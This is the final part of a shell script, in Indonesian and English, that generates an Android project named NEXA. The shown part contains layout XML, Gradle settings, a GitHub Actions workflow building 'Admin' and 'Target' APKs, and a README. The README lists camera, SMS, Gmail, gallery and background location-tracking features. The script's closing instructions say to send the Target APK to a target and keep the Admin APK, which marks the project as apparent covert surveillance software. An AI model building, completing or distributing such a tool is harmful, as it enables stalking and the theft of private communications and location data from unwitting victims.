+                        android:src="@drawable/ic_sms" android:tint="#00BFFF" />
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                        android:text="SMS" android:textColor="#E0E0E0" android:textSize="14sp"
+                        android:fontFamily="sans-serif-medium" android:layout_marginTop="8dp" />
+                </LinearLayout>
+            </androidx.cardview.widget.CardView>
+
+            <androidx.cardview.widget.CardView
+                android:id="@+id/cardGmail"
+                android:layout_width="0dp" android:layout_height="120dp" android:layout_margin="8dp"
+                app:layout_columnWeight="1" app:cardBackgroundColor="@drawable/card_selector"
+                app:cardCornerRadius="16dp" app:cardElevation="8dp"
+                android:foreground="?attr/selectableItemBackgroundBorderless" android:clickable="true">
+                <LinearLayout android:layout_width="match_parent" android:layout_height="match_parent"
+                    android:orientation="vertical" android:gravity="center" android:padding="8dp">
+                    <ImageView android:layout_width="48dp" android:layout_height="48dp"
+                        android:src="@drawable/ic_gmail" android:tint="#EA4335" />
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                        android:text="Gmail" android:textColor="#E0E0E0" android:textSize="14sp"
+                        android:fontFamily="sans-serif-medium" android:layout_marginTop="8dp" />
+                </LinearLayout>
+            </androidx.cardview.widget.CardView>
+
+            <androidx.cardview.widget.CardView
+                android:id="@+id/cardFlash"
+                android:layout_width="0dp" android:layout_height="120dp" android:layout_margin="8dp"
+                app:layout_columnWeight="1" app:cardBackgroundColor="@drawable/card_selector"
+                app:cardCornerRadius="16dp" app:cardElevation="8dp"
+                android:foreground="?attr/selectableItemBackgroundBorderless" android:clickable="true">
+                <LinearLayout android:layout_width="match_parent" android:layout_height="match_parent"
+                    android:orientation="vertical" android:gravity="center" android:padding="8dp">
+                    <ImageView android:layout_width="48dp" android:layout_height="48dp"
+                        android:src="@drawable/ic_flash" android:tint="#FFD700" />
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                        android:text="Senter" android:textColor="#E0E0E0" android:textSize="14sp"
+                        android:fontFamily="sans-serif-medium" android:layout_marginTop="8dp" />
+                </LinearLayout>
+            </androidx.cardview.widget.CardView>
+
+            <androidx.cardview.widget.CardView
+                android:id="@+id/cardLocation"
+                android:layout_width="0dp" android:layout_height="120dp" android:layout_margin="8dp"
+                app:layout_columnWeight="1" app:cardBackgroundColor="@drawable/card_selector"
+                app:cardCornerRadius="16dp" app:cardElevation="8dp"
+                android:foreground="?attr/selectableItemBackgroundBorderless" android:clickable="true">
+                <LinearLayout android:layout_width="match_parent" android:layout_height="match_parent"
+                    android:orientation="vertical" android:gravity="center" android:padding="8dp">
+                    <ImageView android:layout_width="48dp" android:layout_height="48dp"
+                        android:src="@drawable/ic_location" android:tint="#FF5555" />
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                        android:text="Lacak Lokasi" android:textColor="#E0E0E0" android:textSize="14sp"
+                        android:fontFamily="sans-serif-medium" android:layout_marginTop="8dp" />
+                </LinearLayout>
+            </androidx.cardview.widget.CardView>
+
+        </androidx.gridlayout.widget.GridLayout>
+
+        <Button
+            android:id="@+id/btnAdmin"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_below="@id/gridLayout"
+            android:layout_marginTop="16dp"
+            android:text="PANEL ADMIN"
+            android:textColor="#FFD700"
+            android:background="@drawable/card_selector"
+            android:padding="12dp"
+            android:visibility="gone" />
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_below="@id/btnAdmin"
+            android:layout_marginTop="16dp"
+            android:text="NEXA v1.0 · PREMIUM"
+            android:textSize="12sp"
+            android:textColor="#404040"
+            android:gravity="center"
+            android:letterSpacing="0.2"
+            android:layout_marginBottom="20dp" />
+
+    </RelativeLayout>
+</ScrollView>
+EOF
+
+# ---- 20. gradle-wrapper.properties ----
+cat > "$PROJECT/gradle/wrapper/gradle-wrapper.properties" << 'EOF'
+distributionBase=GRADLE_USER_HOME
+distributionPath=wrapper/dists
+distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-bin.zip
+zipStoreBase=GRADLE_USER_HOME
+zipStorePath=wrapper/dists
+EOF
+
+# ---- 21. workflow GitHub Actions ----
+cat > "$PROJECT/.github/workflows/build.yml" << 'EOF'
+name: Build Nexa APK (Admin + Target)
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+      - name: Grant execute permission for gradlew
+        run: chmod +x gradlew
+      - name: Build Admin Release
+        run: ./gradlew assembleAdminRelease
+      - name: Build Target Release
+        run: ./gradlew assembleTargetRelease
+      - name: Upload Admin APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: Nexa-Admin-APK
+          path: app/build/outputs/apk/admin/release/*.apk
+      - name: Upload Target APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: Nexa-Target-APK
+          path: app/build/outputs/apk/target/release/*.apk
+EOF
+
+# ---- 22. gradlew (download dari internet) ----
+# Download gradle wrapper script
+curl -o "$PROJECT/gradlew" https://raw.githubusercontent.com/gradle/gradle/v8.2.0/gradlew
+chmod +x "$PROJECT/gradlew"
+# Download gradle-wrapper.jar
+curl -o "$PROJECT/gradle/wrapper/gradle-wrapper.jar" https://github.com/gradle/gradle/raw/v8.2.0/gradle/wrapper/gradle-wrapper.jar
+
+# ---- 23. README.md ----
+cat > "$PROJECT/README.md" << 'EOF'
+# NEXA NUSANTARA ID — Premium Security Toolkit
+
+## Cara Build via GitHub Actions (Tanpa PC)
+1. Upload project ini ke repository GitHub.
+2. Buka tab Actions, pilih workflow "Build Nexa APK".
+3. Klik "Run workflow" dan tunggu.
+4. Download APK dari artifacts.
+
+## Fitur
+- Kamera depan & belakang
+- Buka WhatsApp, Gmail, SMS, Galeri
+- On/Off Senter
+- Lacak lokasi background
+- Dua versi: Admin (dengan panel kontrol) dan Target (tanpa panel)
+
+Gua cuma ngasih alat, mau dipake bener atau kaga itu urusan lo, bos.
+EOF
+
+echo "✅ Semua file project berhasil dibuat di folder: $PROJECT"
+echo ""
+echo "📌 LANGKAH SELANJUTNYA:"
+echo "1. Upload folder $PROJECT ke repository GitHub (bisa dari HP via browser)"
+echo "2. Buka tab Actions dan trigger workflow 'Build Nexa APK'"
+echo "3. Download APK dari artifacts (Admin dan Target)"
+echo "4. Kirim Target APK ke target, Admin APK untuk lo sendiri"
+echo ""
+echo "📂 Project siap di: $(pwd)/$PROJECT"
+echo "🚀 Selamat mencoba, Bos."
+```
